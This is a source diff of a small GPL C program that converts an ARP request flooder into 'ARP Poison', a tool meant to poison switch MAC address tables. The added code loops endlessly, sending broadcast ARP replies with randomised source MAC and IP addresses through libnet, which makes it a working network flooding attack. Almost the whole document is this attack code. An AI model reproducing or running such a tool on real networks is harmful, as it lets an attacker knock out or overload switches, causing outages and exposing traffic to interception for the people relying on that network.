@@ -1,8 +1,8 @@
 /*
-   ARP Flood - Ethernet flooder based on ARP protocol
+   ARP Poison - Poison switches MAC address tables
    Copyright (C) 2006 Krzysztof Burghardt.
 
-   $Id: arpflood.c,v 1.4 2006-03-08 00:10:42 kb Exp $
+   $Id: arppoison.c,v 1.1 2006-03-08 00:10:42 kb Exp $
 
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
@@ -34,6 +34,8 @@
 #include <pcap.h>
 /* libnet */
 #include <libnet.h>
+/* timne() */
+#include <time.h>
 
 void pcap_die (pcap_t *pcap_handle, char *message) {
     fprintf(stderr, "%s: %s\n", message, pcap_geterr(pcap_handle));
@@ -67,29 +69,18 @@ char *hw_ntoa(struct libnet_ether_addr *hw) {
 
 int main (int argc, char **argv) {
     char *interface = NULL;
-    pcap_t *pcap_handle = NULL;
     libnet_t *libnet_handle = NULL;
     char pcap_error_buffer[PCAP_ERRBUF_SIZE];
     char libnet_error_buffer[LIBNET_ERRBUF_SIZE];
     struct libnet_ether_addr *hw_src = NULL;
     struct libnet_ether_addr *hw_dst = NULL;
     struct in_addr ip_src, ip_dst;
-    struct bpf_program socket_filter;
-    struct pcap_pkthdr packet_header;
-    char filter[1024];
     u_int8_t *packet = NULL;
     u_int32_t packet_size;
-    const unsigned char *pcap_packet = NULL;
-    pid_t pid;
     int status;
-    
-    if (argc < 2) {
-	fprintf(stderr, "Usage: %s dst_ip [interface]\n", argv[0]);
-	exit(EXIT_FAILURE);
-    }
-    
-    if (argc > 2)
-	interface = argv[2];
+
+    if (argc > 1)
+	interface = argv[1];
 
     if (interface == NULL)
 	interface = pcap_lookupdev(pcap_error_buffer);
@@ -101,23 +92,18 @@ int main (int argc, char **argv) {
     
     printf ("using inteface %s\n", interface);
     
-    if ((pcap_handle = pcap_open_live(interface, BUFSIZ, 1, 0, pcap_error_buffer)) == NULL) {
-	fprintf(stderr, "pcap_open_live: %s\n", pcap_error_buffer);
-	exit(EXIT_FAILURE);
-    }
-
     if ((libnet_handle = libnet_init(LIBNET_LINK_ADV, interface, libnet_error_buffer)) == NULL) {
 	fprintf(stderr, "%s", libnet_error_buffer);
 	exit(EXIT_FAILURE);
     }
+
+    /* seed random number generator with an unique number */
+    srand(getpid()*time(NULL));
     
-    if ((hw_src = libnet_get_hwaddr(libnet_handle)) == NULL)
-	libnet_die(libnet_handle);
-
-    printf("our hw address is %s\n", hw_ntoa(hw_src));
-
-    ip_src.s_addr = libnet_get_ipaddr4(libnet_handle);
-    printf("our ip address is %s\n", inet_ntoa(ip_src));
+    if ((hw_src = malloc(sizeof(struct libnet_ether_addr))) == NULL) {
+	fprintf(stderr, "%s\n", strerror(errno));
+	exit(EXIT_FAILURE);
+    }
 
     if ((hw_dst = malloc(sizeof(struct libnet_ether_addr))) == NULL) {
 	fprintf(stderr, "%s\n", strerror(errno));
@@ -128,49 +114,28 @@ int main (int argc, char **argv) {
 	hw_dst->ether_addr_octet[2] = hw_dst->ether_addr_octet[3] =
 	hw_dst->ether_addr_octet[4] = hw_dst->ether_addr_octet[5] = 0xff;
 
-    sprintf(filter, "ether dst %s && arp", hw_ntoa(hw_src));
-    printf("bpf filter is '%s'\n", filter);
+    hw_src->ether_addr_octet[0] = 0x00;
+
+    ip_dst.s_addr = 0;
+
+    printf("flooding with arp packets with random hw / ip addresses\n");
+
+    for (;;) {
     
-    if (pcap_compile(pcap_handle, &socket_filter, filter, 0, 0) == -1)
-	pcap_die(pcap_handle, "pcap_compile");
-
-    if (pcap_setfilter(pcap_handle, &socket_filter) == -1)
-	pcap_die(pcap_handle, "pcap_setfilter");
-
-    switch (pid = fork ()) {
-	case -1:
-	    fprintf(stderr, "%s\n", strerror(errno));
-            exit(EXIT_FAILURE);
-	case 0:
-	    alarm(10); /* timeout if no packet arrives */
-	    for (;;) {
-		pcap_packet = pcap_next(pcap_handle, &packet_header);
+	    ip_src.s_addr = rand();
 	    
-		if (pcap_packet[20] == 0 && pcap_packet[21] == 2) {
-		    printf("O");
-		} else
-		    printf("?");
-		alarm(3); /* timeout after last received packet */
-	    }
-	    break;
-	default:
-	    printf("sniffer fork()ed into background with pid = %i\n", pid);
-
-	    sleep(1); /* give child time to born */
-
-	    if (inet_aton(argv[1], &ip_dst) == 0) {
-		fprintf(stderr, "inet_aton: invalid address\n");
-		exit(EXIT_FAILURE);
-	    }
-
-	    printf("flooding with requests for hw address of ip address %s\n", inet_ntoa (ip_dst));
+	    hw_src->ether_addr_octet[1] = (int) (80.0*rand()/(RAND_MAX+1.0));
+	    hw_src->ether_addr_octet[2] = (int) (255.0*rand()/(RAND_MAX+1.0));
+	    hw_src->ether_addr_octet[3] = (int) (255.0*rand()/(RAND_MAX+1.0));
+	    hw_src->ether_addr_octet[4] = (int) (255.0*rand()/(RAND_MAX+1.0));
+	    hw_src->ether_addr_octet[5] = (int) (255.0*rand()/(RAND_MAX+1.0));
 
 	    if (libnet_build_arp(
 		    ARPHRD_ETHER,			/* hardware addr */
         	    ETHERTYPE_IP,			/* protocol addr */
         	    ETHER_ADDR_LEN,			/* hardware addr size */
         	    4,					/* protocol addr size */
-        	    ARPOP_REQUEST,			/* operation type */
+        	    ARPOP_REPLY,			/* operation type */
     		    hw_src->ether_addr_octet,		/* sender hardware addr */
         	    (u_int8_t *)&ip_src.s_addr,		/* sender protocol addr */
         	    hw_dst->ether_addr_octet,		/* target hardware addr */
@@ -196,25 +161,19 @@ int main (int argc, char **argv) {
 
 	    libnet_adv_free_packet(libnet_handle, packet);
 
-	    for (;;) {
 
-		if ((status = libnet_write(libnet_handle)) == -1)
-		    printf("!");
-		else
-		    printf(".");
+	    if ((status = libnet_write(libnet_handle)) == -1)
+	        printf("!");
+	    else
+	        printf(".");
 
-	    }
+	    usleep(100);
 
 	    libnet_clear_packet(libnet_handle);
 
-	    printf("waiting for sniffer terminate\n");
-	    
-	    if (wait(&status) == pid)
-		printf("sniffer terminated, exiting\n");
     }
 
     libnet_destroy(libnet_handle);
-    pcap_close(pcap_handle);
 
     return EXIT_SUCCESS;
 }
